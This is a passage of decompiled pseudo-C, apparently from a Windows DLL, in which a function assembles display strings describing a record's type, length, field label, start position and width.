cVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    ulong uVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    uint64_t uVar13;\n    ulong uVar14;\n    ulong *puVar15;\n    int64_t **arg1_00;\n    int64_t *piVar16;\n    ulong *puVar17;\n    uint *puVar18;\n    int32_t iVar19;\n    int64_t *piVar20;\n    ulong *******pppppppuVar21;\n    uchar *arg1_01;\n    uint32_t uVar22;\n    char16_t *arg2_00;\n    ushort *puVar23;\n    uint32_t uVar24;\n    ushort *puVar25;\n    ushort *puVar26;\n    int64_t **ppiVar27;\n    int64_t *******pppppppiVar28;\n    ulong *******pppppppuVar29;\n    int32_t iVar30;\n    int64_t iVar31;\n    uint64_t uVar32;\n    int32_t iVar33;\n    int64_t *******pppppppiVar34;\n    uchar auStack920 [32];\n    int64_t *piStack888;\n    ushort uStack872;\n    unkbyte6 Stack870;\n    int64_t *piStack856;\n    uint64_t uStack848;\n    uint32_t uStack840;\n    ulong *******pppppppuStack832;\n    int64_t iStack824;\n    int64_t *piStack816;\n    uint64_t uStack808;\n    uint64_t uStack800;\n    uint64_t uStack792;\n    uint64_t uStack784;\n    int64_t iStack776;\n    uchar uStack768;\n    uchar uStack767;\n    ushort uStack766;\n    uint uStack764;\n    uint uStack760;\n    uint uStack756;\n    uchar auStack752 [16];\n    int64_t aiStack736 [3];\n    uint64_t uStack712;\n    ulong uStack704;\n    int64_t *piStack696;\n    int64_t iStack688;\n    uint64_t uStack680;\n    ushort uStack672;\n    ushort uStack670;\n    uint uStack668;\n    uint uStack664;\n    uint uStack660;\n    uchar auStack656 [16];\n    ushort uStack640;\n    ushort uStack638;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uchar auStack624 [16];\n    int64_t *******pppppppiStack608;\n    int64_t *piStack600;\n    int64_t *piStack592;\n    int64_t *piStack584;\n    ulong uStack576;\n    int32_t iStack568;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    int64_t iStack544;\n    uint uStack536;\n    uint uStack532;\n    ushort uStack528;\n    unkbyte6 Stack526;\n    int64_t *piStack512;\n    uint64_t uStack504;\n    uchar auStack496 [16];\n    uint uStack480;\n    uint uStack476;\n    uint uStack472;\n    uint uStack468;\n    int16_t aiStack456 [160];\n    ulong var_80h;\n    ulong var_78h;\n    ulong var_70h;\n    ulong var_68h;\n    ulong var_bp_58h;\n    ulong var_48h;\n    uint64_t var_bp_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    uStack576 = 0xfffffffffffffffe;\n    var_bp_30h = *0x180123080 ^ auStack920;\n    uVar24 = 0;\n    uStack840 = 0;\n    piStack696 = arg1;\n    cVar5 = (**(*arg1 + 0x58))();\n    if (cVar5 == '\\0') goto code_r0x00018005e484;\n    iVar31 = -1;\n    iStack568 = -1;\n    (**0x1800de7f0)(*0x18012a390, 0x7ec);\n    if (iStack568 < 0) goto code_r0x00018005e484;\n    iVar11 = *0x18012a398;\n    if (iStack568 != 0) {\n        iVar11 = *0x18012a3a0;\n    }\n    iStack776 = iVar11;\n    if (iVar11 == 0) goto code_r0x00018005e484;\n    uStack480 = *0x180101910;\n    uStack476 = *0x180101914;\n    uStack472 = *0x180101918;\n    uStack468 = *0x18010191c;\n    auStack496[0] = 0;\n    cVar5 = fcn.1800602c0(arg1, auStack496);\n    if (cVar5 != '\\0') {\n        iStack544 = CONCAT44(*0x180101904, *0x180101900);\n        uStack536 = *0x180101908;\n        uStack532 = *0x18010190c;\n        uStack560._0_2_ = 0;\n        piVar20 = aiStack736;\n        uVar9 = fcn.18000de50(piVar20, auStack496);\n        cVar5 = fcn.180008800(piVar20, uVar9);\n        piStack512 = NULL;\n        uStack504 = 7;\n        uStack528 = 0;\n        fcn.180010d70(&uStack528, 0x1800fbd74, 2);\n        *(arg1 + 0x18) = 0xffffffff;\n        uStack704 = (**0x1800de7f0)(iVar11, 0x7d8, 0);\n        iStack688 = uStack704;\n        uStack680 = (**0x1800de7f0)(iVar11, 0x876, iStack688);\n        piVar20 = piStack696;\n        if ((arg2 <= uStack680) && (uStack680 <= arg3)) {\n            if (-1 < *(arg1 + 0x17)) {\n                iVar33 = uStack704;\n                if (iVar33 == *(arg1 + 0xb4)) {\n                    uVar9 = 0xc;\n                    arg2_00 = L\"<Record End>\";\n                    goto code_r0x00018005c29e;\n                }\n                if (*(arg1 + 0xbc) <= iVar33) {\n                    uVar9 = 0x13;\n                    arg2_00 = L\"<Record Terminator>\";\n                    goto code_r0x00018005c29e;\n                }\n                uVar32 = *(arg1 + 0x17) * 0xe8 + arg1[0x2c];\n                uVar24 = 0;\n                iVar30 = -1;\n                iVar19 = *(piStack696 + 0x16);\n                uStack792 = uVar32;\n                if (cVar5 == '\\0') {\n                    uVar8 = iVar33 - iVar19;\n                    uStack784 = uVar8;\n                    uVar12 = *(arg1 + 0xbc) - iVar19;\n                }\n                else {\n                    uStack784 = (**0x1800de7f0)(iStack776, 0xa49, iVar19, iStack688);\n                    uVar8 = uStack784;\n                    uVar12 = (**0x1800de7f0)(iStack776, 0xa49, *(piVar20 + 0x16), *(piVar20 + 0xbc));\n                }\n                puVar18 = fcn.18002e7e0(&pppppppuStack832, L\"  Record Type: \", uVar32);\n                if (&uStack560 == puVar18) {\ncode_r0x00018005c3be:\n                    if (7 < uStack808) {\n                        pppppppuVar21 = pppppppuStack832;\n                        if ((0xfff < uStack808 * 2 + 2) &&\n                           (pppppppuVar21 = pppppppuStack832[-1],  0x1f < pppppppuStack832 + (-8 - pppppppuVar21)))\n                        goto code_r0x00018005e4ba;\n                        fcn.18008fb24(pppppppuVar21);\n                    }\n                    uStack800 = *(uVar32 + 0xc0) - *(uVar32 + 0xb8) >> 5;\n                    uVar13 = 0;\n                    iVar33 = *(uVar32 + 0x90) - *(uVar32 + 0x88) >> 2;\n                    if (0 < iVar33) {\n                        uVar32 = uVar13;\n                        do {\n                            uVar24 = uVar24 + *(*(uVar32 + 0xa0) + uVar13 * 4);\n                            if ((*(*(uVar32 + 0x88) + uVar13 * 4) <= uVar8) && (uVar8 < uVar24)) {\n                                iVar30 = uVar32;\n                            }\n                            uVar32 = uVar32 + 1;\n                            uVar13 = uVar13 + 1;\n                        } while (uVar13 < iVar33);\n                    }\n                    uVar9 = fcn.180020b50(aiStack736, uVar24);\n                    uVar14 = fcn.180020b50(&pppppppuStack832, uVar12 & 0xffffffff);\n                    piVar20 = piStack512;\n                    piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                    uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                    uStack872 = 0;\n                    uStack840 = 0x10;\n                    fcn.18000d550(&uStack872, piStack512 + 0xf);\n                    puVar23 = &uStack528;\n                    if (7 < uStack504) {\n                        puVar23 = CONCAT62(Stack526, uStack528);\n                    }\n                    if (uStack848 - piStack856 < piVar20) {\n                        piStack888 = piVar20;\n                        fcn.180013690(&uStack872, piVar20, 0, puVar23);\n                        piVar20 = piStack512;\n                    }\n                    else {\n                        piVar16 = piStack856 + piVar20;\n                        puVar25 = &uStack872;\n                        if (7 < uStack848) {\n                            puVar25 = CONCAT62(Stack870, uStack872);\n                        }\n                        puVar26 = puVar25 + piStack856;\n                        piStack856 = piVar16;\n                        fcn.1800ade80(puVar26, puVar23, piVar20 * 2);\n                        puVar25[piVar16] = 0;\n                    }\n                    if (uStack848 - piStack856 < 0xf) {\n                        piStack888 = 0xf;\n                        fcn.180013690(&uStack872, 0xf, 0, L\"Record Length: \");\n                    }\n                    else {\n                        piVar16 = piStack856 + 0xf;\n                        puVar23 = &uStack872;\n                        if (7 < uStack848) {\n                            puVar23 = CONCAT62(Stack870, uStack872);\n                        }\n                        puVar25 = puVar23 + piStack856;\n                        piStack856 = piVar16;\n                        fcn.1800ade80(puVar25, L\"Record Length: \", 0x1e);\n                        puVar23[piVar16] = 0;\n                    }\n                    puVar17 = fcn.18002e490(&uStack640, &uStack872, uVar14);\n                    uVar32 = puVar17[2];\n                    if (puVar17[3] == uVar32) {\n                        piStack888 = 0x1;\n                        puVar17 = fcn.180013690(puVar17, 1, 0, 0x1800f8e14);\n                    }\n                    else {\n                        puVar17[2] = uVar32 + 1;\n                        puVar15 = puVar17;\n                        if (7 < puVar17[3]) {\n                            puVar15 = *puVar17;\n                        }\n                        *(puVar15 + uVar32 * 2) = 0x2f;\n                        *(puVar15 + (uVar32 + 1) * 2) = 0;\n                    }\n                    uVar3 = *puVar17;\n                    uStack764 = *(puVar17 + 4);\n                    uStack760 = *(puVar17 + 1);\n                    uStack756 = *(puVar17 + 0xc);\n                    uStack768 = uVar3;\n                    uStack767 = uVar3 >> 8;\n                    uStack766 = uVar3 >> 0x10;\n                    auStack752 = *(puVar17 + 2);\n                    puVar17[2] = 0;\n                    puVar17[3] = 7;\n                    *puVar17 = 0;\n                    uStack840 = 0x30;\n                    arg1_00 = fcn.18002e490(&uStack672, &uStack768, uVar9);\n                    piVar16 = arg1_00[2];\n                    if (arg1_00[3] - piVar16 < 0x12) {\n                        piStack888 = 0x12;\n                        arg1_00 = fcn.180013690(arg1_00, 0x12, 0, L\" [Current/Defined]\");\n                    }\n                    else {\n                        arg1_00[2] = piVar16 + 0x12;\n                        ppiVar27 = arg1_00;\n                        if (0x7 < arg1_00[3]) {\n                            ppiVar27 = *arg1_00;\n                        }\n                        fcn.1800ade80(ppiVar27 + piVar16 * 2, L\" [Current/Defined]\", 0x24);\n                        *(ppiVar27 + (piVar16 + 0x12) * 2) = 0;\n                    }\n                    pppppppiVar34 = *arg1_00;\n                    piStack600 = arg1_00[1];\n                    piStack592 = arg1_00[2];\n                    piVar16 = arg1_00[3];\n                    arg1_00[2] = NULL;\n                    arg1_00[3] = 0x7;\n                    *arg1_00 = 0;\n                    uStack840 = 0x70;\n                    pppppppiVar28 = &pppppppiStack608;\n                    if (0x7 < piVar16) {\n                        pppppppiVar28 = pppppppiVar34;\n                    }\n                    pppppppiStack608 = pppppppiVar34;\n                    piStack584 = piVar16;\n                    if (CONCAT44(uStack532, uStack536) - iStack544 < piStack592) {\n                        piStack888 = piStack592;\n                        fcn.180013690(&uStack560, piStack592, 0, pppppppiVar28);\n                        piVar16 = piStack584;\n                        pppppppiVar34 = pppppppiStack608;\n                    }\n                    else {\n                        iVar11 = piStack592 + iStack544;\n                        puVar23 = &uStack560;\n                        if (7 < CONCAT44(uStack532, uStack536)) {\n                            puVar23 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                        }\n                        puVar25 = puVar23 + iStack544;\n                        iStack544 = iVar11;\n                        fcn.1800ade80(puVar25, pppppppiVar28, piStack592 * 2);\n                        puVar23[iVar11] = 0;\n                    }\n                    if (0x7 < piVar16) {\n                        pppppppiVar28 = pppppppiVar34;\n                        if ((piVar16 * 2 + 2U < 0x1000) ||\n                           (pppppppiVar28 = pppppppiVar34[-1],  pppppppiVar34 + (-8 - pppppppiVar28) < 0x20)) {\n                            fcn.18008fb24(pppppppiVar28);\n                            goto code_r0x00018005c78c;\n                        }\n                        goto code_r0x00018005e4c0;\n                    }\ncode_r0x00018005c78c:\n                    if (7 < auStack656._8_8_) {\n                        iVar10 = CONCAT44(uStack668, CONCAT22(uStack670, uStack672));\n                        iVar11 = iVar10;\n                        if ((auStack656._8_8_ * 2 + 2 < 0x1000) ||\n                           (iVar11 = *(iVar10 + -8),  (iVar10 - iVar11) - 8U < 0x20)) {\n                            fcn.18008fb24(iVar11);\n                            goto code_r0x00018005c7cc;\n                        }\n                        goto code_r0x00018005e4c6;\n                    }\ncode_r0x00018005c7cc:\n                    auStack656 = CONCAT412(*0x18010190c, CONCAT48(*0x180101908, CONCAT44(*0x180101904, *0x180101900)));\n                    uStack672 = 0;\n                    if (7 < auStack752._8_8_) {\n                        iVar10 = CONCAT44(uStack764, CONCAT22(uStack766, CONCAT11(uStack767, uStack768)));\n                        iVar11 = iVar10;\n                        if ((auStack752._8_8_ * 2 + 2 < 0x1000) ||\n                           (iVar11 = *(iVar10 + -8),  (iVar10 - iVar11) - 8U < 0x20)) {\n                            fcn.18008fb24(iVar11);\n                            goto code_r0x00018005c821;\n                        }\n                        goto code_r0x00018005e4cc;\n                    }\ncode_r0x00018005c821:\n                    auStack752._0_8_ = CONCAT44(*0x180101904, *0x180101900);\n                    auStack752._0_12_ = CONCAT48(*0x180101908, auStack752._0_8_);\n                    auStack752 = CONCAT412(*0x18010190c, auStack752._0_12_);\n                    uStack768 = 0;\n                    uStack767 = 0;\n                    if (7 < auStack624._8_8_) {\n                        iVar10 = CONCAT44(uStack636, CONCAT22(uStack638, uStack640));\n                        iVar11 = iVar10;\n                        if ((auStack624._8_8_ * 2 + 2 < 0x1000) ||\n                           (iVar11 = *(iVar10 + -8),  (iVar10 - iVar11) - 8U < 0x20)) {\n                            fcn.18008fb24(iVar11);\n                            goto code_r0x00018005c873;\n                        }\n                        goto code_r0x00018005e4d2;\n                    }\ncode_r0x00018005c873:\n                    auStack624 = CONCAT412(*0x18010190c, CONCAT48(*0x180101908, CONCAT44(*0x180101904, *0x180101900)));\n                    uStack640 = 0;\n                    if (7 < uStack848) {\n                        iVar10 = CONCAT62(Stack870, uStack872);\n                        iVar11 = iVar10;\n                        if ((uStack848 * 2 + 2 < 0x1000) || (iVar11 = *(iVar10 + -8),  (iVar10 - iVar11) - 8U < 0x20)) {\n                            fcn.18008fb24(iVar11);\n                            goto code_r0x00018005c8c7;\n                        }\n                        goto code_r0x00018005e4d8;\n                    }\ncode_r0x00018005c8c7:\n                    piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                    uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                    uStack872 = 0;\n                    if (uStack808 < 8) {\ncode_r0x00018005c91d:\n                        piStack816 = CONCAT44(*0x180101904, *0x180101900);\n                        uStack808 = CONCAT44(*0x18010190c, *0x180101908);\n                        pppppppuStack832 = pppppppuStack832 & 0xffffffffffff0000;\n                        if (7 < uStack712) {\n                            iVar11 = aiStack736[0];\n                            if ((0xfff < uStack712 * 2 + 2) &&\n                               (iVar11 = *(aiStack736[0] + -8),  0x1f < (aiStack736[0] - iVar11) - 8U))\n                            goto code_r0x00018005e4e4;\n                            fcn.18008fb24(iVar11);\n                        }\n                        if (iVar30 < 0) {\n                            piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                            uStack872 = 0;\n                            uStack840 = 0xe0;\n                            fcn.18000d550(&uStack872, piVar20 + 0xd);\n                            puVar23 = &uStack528;\n                            if (7 < uStack504) {\n                                puVar23 = CONCAT62(Stack526, uStack528);\n                            }\n                            if (uStack848 - piStack856 < piVar20) {\n                                piStack888 = piVar20;\n                                fcn.180013690(&uStack872, piVar20, 0, puVar23);\n                                piVar20 = piStack512;\n                            }\n                            else {\n                                piVar16 = piStack856 + piVar20;\n                                puVar25 = &uStack872;\n                                if (7 < uStack848) {\n                                    puVar25 = CONCAT62(Stack870, uStack872);\n                                }\n                                puVar26 = puVar25 + piStack856;\n                                piStack856 = piVar16;\n                                fcn.1800ade80(puVar26, puVar23, piVar20 * 2);\n                                puVar25[piVar16] = 0;\n                            }\n                            if (uStack848 - piStack856 < 0xd) {\n                                piStack888 = 0xd;\n                                fcn.180013690(&uStack872, 0xd, 0, L\"    Overflow!\");\n                            }\n                            else {\n                                piVar16 = piStack856 + 0xd;\n                                puVar23 = &uStack872;\n                                if (7 < uStack848) {\n                                    puVar23 = CONCAT62(Stack870, uStack872);\n                                }\n                                puVar25 = puVar23 + piStack856;\n                                piStack856 = piVar16;\n                                fcn.1800ade80(puVar25, L\"    Overflow!\", 0x1a);\n                                puVar23[piVar16] = 0;\n                            }\n                            iVar11 = iStack544;\n                            piVar16 = piStack856;\n                            puVar23 = &uStack872;\n                            if (7 < uStack848) {\n                                puVar23 = CONCAT62(Stack870, uStack872);\n                            }\n                            if (CONCAT44(uStack532, uStack536) - iStack544 < piStack856) {\n                                piStack888 = piStack856;\n                                fcn.180013690(&uStack560, piStack856, 0, puVar23);\n                            }\n                            else {\n                                puVar25 = &uStack560;\n                                if (7 < CONCAT44(uStack532, uStack536)) {\n                                    puVar25 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                                }\n                                puVar26 = puVar25 + iStack544;\n                                iStack544 = piStack856 + iStack544;\n                                fcn.1800ade80(puVar26, puVar23, piStack856 * 2);\n                                puVar25[piVar16 + iVar11] = 0;\n                            }\n                            if (7 < uStack848) {\n                                iVar10 = CONCAT62(Stack870, uStack872);\n                                iVar11 = iVar10;\n                                if (0xfff < uStack848 * 2 + 2) {\n                                    iVar11 = *(iVar10 + -8);\n                                    if (0x1f < (iVar10 - iVar11) - 8U) {\n                                        fcn.1800b3528(iVar11, uStack848 * 2 + 0x29);\n                                        pcVar2 = swi(3);\n                                        (*pcVar2)();\n                                        return;\n                                    }\n                                }\n                                fcn.18008fb24(iVar11);\n                            }\n                            uVar24 = 0x60;\n                            goto code_r0x00018005d72d;\n                        }\n                        *(piStack696 + 0x18) = iVar30;\n                        piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                        uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                        uStack872 = 0;\n                        uStack840 = 0x160;\n                        fcn.18000d550(&uStack872, piVar20 + 0xf);\n                        puVar23 = &uStack528;\n                        if (7 < uStack504) {\n                            puVar23 = CONCAT62(Stack526, uStack528);\n                        }\n                        if (uStack848 - piStack856 < piVar20) {\n                            piStack888 = piVar20;\n                            fcn.180013690(&uStack872, piVar20, 0, puVar23);\n                            piVar20 = piStack512;\n                        }\n                        else {\n                            piVar16 = piStack856 + piVar20;\n                            puVar25 = &uStack872;\n                            if (7 < uStack848) {\n                                puVar25 = CONCAT62(Stack870, uStack872);\n                            }\n                            puVar26 = puVar25 + piStack856;\n                            piStack856 = piVar16;\n                            fcn.1800ade80(puVar26, puVar23, piVar20 * 2);\n                            puVar25[piVar16] = 0;\n                        }\n                        if (uStack848 - piStack856 < 0xf) {\n                            piStack888 = 0xf;\n                            fcn.180013690(&uStack872, 0xf, 0, L\"  Field Label: \");\n                        }\n                        else {\n                            piVar16 = piStack856 + 0xf;\n                            puVar23 = &uStack872;\n                            if (7 < uStack848) {\n                                puVar23 = CONCAT62(Stack870, uStack872);\n                            }\n                            puVar25 = puVar23 + piStack856;\n                            piStack856 = piVar16;\n                            fcn.1800ade80(puVar25, L\"  Field Label: \", 0x1e);\n                            puVar23[piVar16] = 0;\n                        }\n                        iVar11 = iStack544;\n                        piVar16 = piStack856;\n                        puVar23 = &uStack872;\n                        if (7 < uStack848) {\n                            puVar23 = CONCAT62(Stack870, uStack872);\n                        }\n                        if (CONCAT44(uStack532, uStack536) - iStack544 < piStack856) {\n                            piStack888 = piStack856;\n                            fcn.180013690(&uStack560, piStack856, 0, puVar23);\n                        }\n                        else {\n                            puVar25 = &uStack560;\n                            if (7 < CONCAT44(uStack532, uStack536)) {\n                                puVar25 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                            }\n                            puVar26 = puVar25 + iStack544;\n                            iStack544 = piStack856 + iStack544;\n                            fcn.1800ade80(puVar26, puVar23, piStack856 * 2);\n                            puVar25[piVar16 + iVar11] = 0;\n                        }\n                        if (uStack848 < 8) {\ncode_r0x00018005cd13:\n                            uVar32 = uStack792;\n                            if ((uStack800 == 0) || (uStack800 <= iVar30)) {\n                                uVar32 = iVar30 + 1;\n                                uVar9 = fcn.180020b50(aiStack736, uVar32);\n                                piVar16 = fcn.180014b80(uVar9, uVar32, 0x1800fcda8, 7);\n                                pppppppuVar21 = *piVar16;\n                                iStack824 = piVar16[1];\n                                piStack816 = piVar16[2];\n                                uVar32 = piVar16[3];\n                                piVar16[2] = 0;\n                                piVar16[3] = 7;\n                                *piVar16 = 0;\n                                pppppppuVar29 = &pppppppuStack832;\n                                if (7 < uVar32) {\n                                    pppppppuVar29 = pppppppuVar21;\n                                }\n                                pppppppuStack832 = pppppppuVar21;\n                                uStack808 = uVar32;\n                                if (CONCAT44(uStack532, uStack536) - iStack544 < piStack816) {\n                                    piStack888 = piStack816;\n                                    fcn.180013690(&uStack560, piStack816, 0, pppppppuVar29);\n                                    uVar32 = uStack808;\n                                    pppppppuVar21 = pppppppuStack832;\n                                }\n                                else {\n                                    iVar11 = piStack816 + iStack544;\n                                    puVar23 = &uStack560;\n                                    if (7 < CONCAT44(uStack532, uStack536)) {\n                                        puVar23 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                                    }\n                                    puVar25 = puVar23 + iStack544;\n                                    iStack544 = iVar11;\n                                    fcn.1800ade80(puVar25, pppppppuVar29, piStack816 * 2);\n                                    puVar23[iVar11] = 0;\n                                }\n                                uVar24 = 0x260;\n                                if (7 < uVar32) {\n                                    pppppppuVar29 = pppppppuVar21;\n                                    if ((0xfff < uVar32 * 2 + 2) &&\n                                       (pppppppuVar29 = pppppppuVar21[-1],  0x1f < pppppppuVar21 + (-8 - pppppppuVar29))\n                                       ) goto code_r0x00018005e4f6;\n                                    fcn.18008fb24(pppppppuVar29);\n                                }\n                                uVar32 = uStack792;\n                                if (7 < uStack712) {\n                                    iVar11 = aiStack736[0];\n                                    if ((0xfff < uStack712 * 2 + 2) &&\n                                       (iVar11 = *(aiStack736[0] + -8),  0x1f < (aiStack736[0] - iVar11) - 8U))\n                                    goto code_r0x00018005e4fc;\n                                    fcn.18008fb24(iVar11);\n                                    uVar32 = uStack792;\n                                }\n                            }\n                            else {\n                                puVar17 = iVar30 * 0x20 + *(uStack792 + 0xb8);\n                                piVar16 = puVar17[2];\n                                if (7 < puVar17[3]) {\n                                    puVar17 = *puVar17;\n                                }\n                                if (CONCAT44(uStack532, uStack536) - iStack544 < piVar16) {\n                                    piStack888 = piVar16;\n                                    fcn.180013690(&uStack560, piVar16, 0, puVar17);\n                                    uVar24 = 0x60;\n                                }\n                                else {\n                                    iVar11 = piVar16 + iStack544;\n                                    puVar23 = &uStack560;\n                                    if (7 < CONCAT44(uStack532, uStack536)) {\n                                        puVar23 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                                    }\n                                    puVar25 = puVar23 + iStack544;\n                                    iStack544 = iVar11;\n                                    fcn.1800ade80(puVar25, puVar17, piVar16 * 2);\n                                    puVar23[iVar11] = 0;\n                                    uVar24 = 0x60;\n                                }\n                            }\n                            uVar8 = *(*(uVar32 + 0x88) + iVar30 * 4);\n                            uStack800 = uStack800 & 0xffffffff00000000 | uVar8;\n                            uVar22 = *(*(uVar32 + 0xa0) + iVar30 * 4);\n                            uStack792 = uStack792 & 0xffffffff00000000 | uVar22;\n                            uVar9 = fcn.180020b50(aiStack736, uVar8 + 1);\n                            piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                            uStack872 = 0;\n                            uStack840 = uVar24 | 0x400;\n                            fcn.18000d550(&uStack872, piVar20 + 0xf);\n                            puVar23 = &uStack528;\n                            if (7 < uStack504) {\n                                puVar23 = CONCAT62(Stack526, uStack528);\n                            }\n                            if (uStack848 - piStack856 < piVar20) {\n                                piStack888 = piVar20;\n                                fcn.180013690(&uStack872, piVar20, 0, puVar23);\n                                piVar20 = piStack512;\n                            }\n                            else {\n                                piVar16 = piStack856 + piVar20;\n                                puVar25 = &uStack872;\n                                if (7 < uStack848) {\n                                    puVar25 = CONCAT62(Stack870, uStack872);\n                                }\n                                puVar26 = puVar25 + piStack856;\n                                piStack856 = piVar16;\n                                fcn.1800ade80(puVar26, puVar23, piVar20 * 2);\n                                puVar25[piVar16] = 0;\n                            }\n                            if (uStack848 - piStack856 < 0xf) {\n                                piStack888 = 0xf;\n                                fcn.180013690(&uStack872, 0xf, 0, L\"  Field Start: \");\n                            }\n                            else {\n                                piVar16 = piStack856 + 0xf;\n                                puVar23 = &uStack872;\n                                if (7 < uStack848) {\n                                    puVar23 = CONCAT62(Stack870, uStack872);\n                                }\n                                puVar25 = puVar23 + piStack856;\n                                piStack856 = piVar16;\n                                fcn.1800ade80(puVar25, L\"  Field Start: \", 0x1e);\n                                puVar23[piVar16] = 0;\n                            }\n                            puVar17 = fcn.18002e490(&pppppppuStack832, &uStack872, uVar9);\n                            piVar16 = puVar17[2];\n                            if (7 < puVar17[3]) {\n                                puVar17 = *puVar17;\n                            }\n                            if (CONCAT44(uStack532, uStack536) - iStack544 < piVar16) {\n                                piStack888 = piVar16;\n                                fcn.180013690(&uStack560, piVar16, 0, puVar17);\n                            }\n                            else {\n                                iVar11 = piVar16 + iStack544;\n                                puVar23 = &uStack560;\n                                if (7 < CONCAT44(uStack532, uStack536)) {\n                                    puVar23 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                                }\n                                puVar25 = puVar23 + iStack544;\n                                iStack544 = iVar11;\n                                fcn.1800ade80(puVar25, puVar17, piVar16 * 2);\n                                puVar23[iVar11] = 0;\n                            }\n                            if (7 < uStack808) {\n                                pppppppuVar21 = pppppppuStack832;\n                                if ((0xfff < uStack808 * 2 + 2) &&\n                                   (pppppppuVar21 = pppppppuStack832[-1], \n                                   0x1f < pppppppuStack832 + (-8 - pppppppuVar21))) goto code_r0x00018005e502;\n                                fcn.18008fb24(pppppppuVar21);\n                            }\n                            piStack816 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack808 = CONCAT44(*0x18010190c, *0x180101908);\n                            pppppppuStack832 = pppppppuStack832 & 0xffffffffffff0000;\n                            if (7 < uStack848) {\n                                iVar10 = CONCAT62(Stack870, uStack872);\n                                iVar11 = iVar10;\n                                if ((0xfff < uStack848 * 2 + 2) &&\n                                   (iVar11 = *(iVar10 + -8),  0x1f < (iVar10 - iVar11) - 8U)) goto code_r0x00018005e508;\n                                fcn.18008fb24(iVar11);\n                            }\n                            piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                            uStack872 = 0;\n                            if (7 < uStack712) {\n                                iVar11 = aiStack736[0];\n                                if ((0xfff < uStack712 * 2 + 2) &&\n                                   (iVar11 = *(aiStack736[0] + -8),  0x1f < (aiStack736[0] - iVar11) - 8U))\n                                goto code_r0x00018005e50e;\n                                fcn.18008fb24(iVar11);\n                            }\n                            uVar9 = fcn.180020b50(aiStack736, uVar22);\n                            piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                            uStack872 = 0;\n                            uStack840 = uVar24 | 0x800;\n                            fcn.18000d550(&uStack872, piVar20 + 0xf);\n                            puVar23 = &uStack528;\n                            if (7 < uStack504) {\n                                puVar23 = CONCAT62(Stack526, uStack528);\n                            }\n                            if (uStack848 - piStack856 < piVar20) {\n                                piStack888 = piVar20;\n                                fcn.180013690(&uStack872, piVar20, 0, puVar23);\n                                piVar20 = piStack512;\n                            }\n                            else {\n                                piVar16 = piStack856 + piVar20;\n                                puVar25 = &uStack872;\n                                if (7 < uStack848) {\n                                    puVar25 = CONCAT62(Stack870, uStack872);\n                                }\n                                puVar26 = puVar25 + piStack856;\n                                piStack856 = piVar16;\n                                fcn.1800ade80(puVar26, puVar23, piVar20 * 2);\n                                puVar25[piVar16] = 0;\n                            }\n                            if (uStack848 - piStack856 < 0xf) {\n                                piStack888 = 0xf;\n                                fcn.180013690(&uStack872, 0xf, 0, L\"  Field Width: \");\n                            }\n                            else {\n                                piVar16 = piStack856 + 0xf;\n                                puVar23 = &uStack872;\n                                if (7 < uStack848) {\n                                    puVar23 = CONCAT62(Stack870, uStack872);\n                                }\n                                puVar25 = puVar23 + piStack856;\n                                piStack856 = piVar16;\n                                fcn.1800ade80(puVar25, L\"  Field Width: \", 0x1e);\n                                puVar23[piVar16] = 0;\n                            }\n                            puVar17 = fcn.18002e490(&pppppppuStack832, &uStack872, uVar9);\n                            piVar16 = puVar17[2];\n                            if (7 < puVar17[3]) {\n                                puVar17 = *puVar17;\n                            }\n                            if (CONCAT44(uStack532, uStack536) - iStack544 < piVar16) {\n                                piStack888 = piVar16;\n                                fcn.180013690(&uStack560, piVar16, 0, puVar17);\n                            }\n                            else {\n                                iVar11 = iStack544 + piVar16;\n                                puVar23 = &uStack560;\n                                if (7 < CONCAT44(uStack532, uStack536)) {\n                                    puVar23 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                                }\n                                puVar25 = puVar23 + iStack544;\n                                iStack544 = iVar11;\n                                fcn.1800ade80(puVar25, puVar17, piVar16 * 2);\n                                puVar23[iVar11] = 0;\n                            }\n                            if (7 < uStack808) {\n                                pppppppuVar21 = pppppppuStack832;\n                                if ((0xfff < uStack808 * 2 + 2) &&\n                                   (pppppppuVar21 = pppppppuStack832[-1], \n                                   0x1f < pppppppuStack832 + (-8 - pppppppuVar21))) goto code_r0x00018005e514;\n                                fcn.18008fb24(pppppppuVar21);\n                            }\n                            piStack816 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack808 = CONCAT44(*0x18010190c, *0x180101908);\n                            pppppppuStack832 = pppppppuStack832 & 0xffffffffffff0000;\n                            if (7 < uStack848) {\n                                iVar10 = CONCAT62(Stack870, uStack872);\n                                iVar11 = iVar10;\n                                if ((0xfff < uStack848 * 2 + 2) &&\n                                   (iVar11 = *(iVar10 + -8),  0x1f < (iVar10 - iVar11) - 8U)) goto code_r0x00018005e51a;\n                                fcn.18008fb24(iVar11);\n                            }\n                            piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                            uStack872 = 0;\n                            if (7 < uStack712) {\n                                